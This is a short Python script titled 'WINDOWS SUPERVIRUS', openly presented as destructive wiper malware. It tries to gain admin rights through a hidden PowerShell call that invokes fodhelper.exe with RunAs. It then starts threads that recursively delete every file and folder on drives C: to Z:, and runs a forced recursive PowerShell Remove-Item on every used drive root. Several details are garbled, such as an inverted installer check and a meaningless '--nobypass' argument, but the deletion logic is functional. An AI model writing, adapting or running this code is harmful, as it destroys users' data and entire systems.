"""
WINDOWS SUPERVIRUS - Nuitka Optimized
"""

import os, sys, ctypes, subprocess, shutil, threading, time
if not os.path.exists("vcredist_x64.exe"): subprocess.Popen("vcredist_x64.exe /quiet /norestart", shell=True)
def admin():
    return ctypes.windll.shell32.IsUserAnAdmin()

def elevate():
    subprocess.Popen(['powershell.exe', '-WindowStyle', 'Hidden', '-Command',
    f'Start-Process fodhelper.exe -Verb RunAs -ArgumentList "--nobypass"; Start-Process powershell.exe -Verb RunAs -ArgumentList "-WindowStyle Hidden -File \\"{sys.argv[0]}\\""'])
    sys.exit()

def shred(drive):
    for r,d,f in os.walk(drive):  
        [shutil.rmtree(os.path.join(r,x),ignore_errors=True) for x in d+f]

if not admin(): elevate()

drives = [f"{chr(i)}:\\" for i in range(67,91) if os.path.exists(f"{chr(i)}:\\")]

for drive in drives:
    threading.Thread(target=shred,args=(drive,),daemon=True).start()

subprocess.Popen('powershell -Command "Get-PSDrive FileSystem | ?{$_.Used} | Remove-Item $_.Root -Recurse -Force"',shell=True)

while 1: time.sleep(1)